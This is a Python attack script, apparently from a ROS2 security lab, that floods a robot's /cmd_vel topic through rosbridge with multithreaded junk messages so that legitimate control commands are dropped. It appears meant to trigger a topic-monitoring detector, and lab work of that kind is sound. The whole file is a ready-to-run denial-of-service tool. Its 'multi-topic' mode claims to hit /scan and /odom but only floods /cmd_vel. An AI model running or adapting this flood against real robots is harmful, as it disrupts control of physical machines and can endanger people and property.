#!/usr/bin/env python3
"""
FILE: attack_dos.py
TYPE: ATTACKER VM Script (runs on ATTACKER VM - Ubuntu in VMware)
PURPOSE: Simulates a Denial-of-Service (DoS) attack by flooding ROS2 topics
         with extremely high-frequency messages. This saturates the DDS
         communication layer, causing legitimate messages to be dropped,
         increasing latency, and destabilizing the robot's behavior.

REQUIREMENTS (on Attacker VM):
    pip3 install roslibpy

HOW TO RUN:
    1. Ensure rosbridge is running on HOST: ros2 launch rosbridge_server rosbridge_websocket_launch.xml
    2. On the Attacker VM: python3 attack_dos.py --host <HOST_IP>
    3. Watch the topic_monitor_node on HOST detect the flood and alert

ATTACK TYPE: Denial of Service (Topic Flooding)
"""

import argparse
import time
import sys
import threading
from datetime import datetime

try:
    import roslibpy
except ImportError:
    print("[ERROR] roslibpy not installed. Run: pip3 install roslibpy")
    sys.exit(1)


class DoSAttack:
    def __init__(self, host: str, port: int = 9090):
        self.host = host
        self.port = port
        self.client = None
        self.running = False
        self.total_sent = 0
        self.lock = threading.Lock()

    def connect(self):
        print(f"[ATTACKER] Connecting to {self.host}:{self.port} ...")
        self.client = roslibpy.Ros(host=self.host, port=self.port)
        self.client.run()
        if self.client.is_connected:
            print("[ATTACKER] ✓ Connected! Ready to flood.")
            return True
        print("[ATTACKER] ✗ Connection failed.")
        return False

    def flood_worker(self, publisher, topic_name: str, message: dict, rate_hz: int):
        """Worker thread that floods a single topic at the given rate."""
        interval = 1.0 / rate_hz
        local_count = 0
        while self.running:
            publisher.publish(roslibpy.Message(message))
            local_count += 1
            with self.lock:
                self.total_sent += 1
            time.sleep(interval)
        print(f"[DoS] Thread for {topic_name} stopped. Sent {local_count} messages.")

    def stats_reporter(self, duration: float):
        """Periodically print flood statistics."""
        start = time.time()
        while self.running and (time.time() - start) < duration:
            time.sleep(2.0)
            elapsed = time.time() - start
            with self.lock:
                rate = self.total_sent / elapsed if elapsed > 0 else 0
            print(
                f"[DoS STATS] Elapsed: {elapsed:.1f}s  |  "
                f"Total sent: {self.total_sent}  |  "
                f"Avg rate: {rate:.0f} msg/s"
            )

    def flood_cmd_vel(self, rate_hz: int = 500, duration: float = 20.0):
        """
        ATTACK: Flood /cmd_vel with junk messages at extreme rates.
        The legitimate robot controller cannot compete and commands are dropped.
        """
        print(f"\n[ATTACK] Starting DoS FLOOD on /cmd_vel")
        print(f"[ATTACK] Rate: {rate_hz} Hz  |  Duration: {duration}s")
        print("[ATTACK] Legitimate control commands will be DROPPED\n")

        publisher = roslibpy.Topic(self.client, '/cmd_vel', 'geometry_msgs/Twist')

        # Junk message - zero movement to be "safe" but still flood the topic
        junk_msg = {
            'linear': {'x': 0.0, 'y': 0.0, 'z': 0.0},
            'angular': {'x': 0.0, 'y': 0.0, 'z': 0.0}
        }

        self.running = True
        self.total_sent = 0

        # Start flood threads
        num_threads = 4  # Multiple threads to maximize flood rate
        threads = []
        for i in range(num_threads):
            t = threading.Thread(
                target=self.flood_worker,
                args=(publisher, '/cmd_vel', junk_msg, rate_hz // num_threads)
            )
            t.daemon = True
            threads.append(t)
            t.start()

        # Stats reporter
        stats_thread = threading.Thread(
            target=self.stats_reporter, args=(duration,)
        )
        stats_thread.daemon = True
        stats_thread.start()

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[ATTACKER] DoS interrupted by user.")
        finally:
            self.running = False

        for t in threads:
            t.join(timeout=2.0)

        print(f"\n[ATTACK] DoS flood complete.")
        print(f"[ATTACK] Total messages sent: {self.total_sent}")
        publisher.unadvertise()

    def flood_all_topics(self, rate_hz: int = 200, duration: float = 20.0):
        """
        ATTACK: Flood ALL robot topics simultaneously for maximum disruption.
        """
        print(f"\n[ATTACK] Starting MULTI-TOPIC DoS FLOOD")
        print(f"[ATTACK] Targeting /cmd_vel, /scan, /odom simultaneously\n")

        publishers = {
            '/cmd_vel': roslibpy.Topic(self.client, '/cmd_vel', 'geometry_msgs/Twist'),
        }

        messages = {
            '/cmd_vel': {
                'linear': {'x': 0.0, 'y': 0.0, 'z': 0.0},
                'angular': {'x': 0.0, 'y': 0.0, 'z': 0.0}
            }
        }

        self.running = True
        self.total_sent = 0
        threads = []

        for topic, pub in publishers.items():
            t = threading.Thread(
                target=self.flood_worker,
                args=(pub, topic, messages[topic], rate_hz)
            )
            t.daemon = True
            threads.append(t)
            t.start()

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[ATTACKER] Multi-topic DoS interrupted.")
        finally:
            self.running = False

        for t in threads:
            t.join(timeout=2.0)

        print(f"\n[ATTACK] Multi-topic DoS complete. Total sent: {self.total_sent}")
        for pub in publishers.values():
            pub.unadvertise()

    def disconnect(self):
        if self.client and self.client.is_connected:
            self.client.terminate()
            print("[ATTACKER] Disconnected.")


def main():
    parser = argparse.ArgumentParser(
        description='ROS2 Denial-of-Service Attack Simulator'
    )
    parser.add_argument('--host', type=str, default='192.168.1.100',
                        help='Host machine IP address')
    parser.add_argument('--port', type=int, default=9090,
                        help='ROS bridge port (default: 9090)')
    parser.add_argument('--rate', type=int, default=500,
                        help='Flood rate in messages/sec (default: 500)')
    parser.add_argument('--duration', type=float, default=20.0,
                        help='Attack duration in seconds (default: 20)')
    parser.add_argument('--mode', type=str, choices=['single', 'multi'], default='single',
                        help='Flood single topic or all topics (default: single)')
    args = parser.parse_args()

    print("=" * 60)
    print("  ROS2 DENIAL-OF-SERVICE ATTACK - SIMULATION ONLY")
    print("  For educational/research use in controlled environments")
    print("=" * 60)

    attacker = DoSAttack(host=args.host, port=args.port)

    if not attacker.connect():
        sys.exit(1)

    try:
        if args.mode == 'single':
            attacker.flood_cmd_vel(rate_hz=args.rate, duration=args.duration)
        else:
            attacker.flood_all_topics(rate_hz=args.rate, duration=args.duration)
    finally:
        attacker.disconnect()


if __name__ == '__main__':
    main()
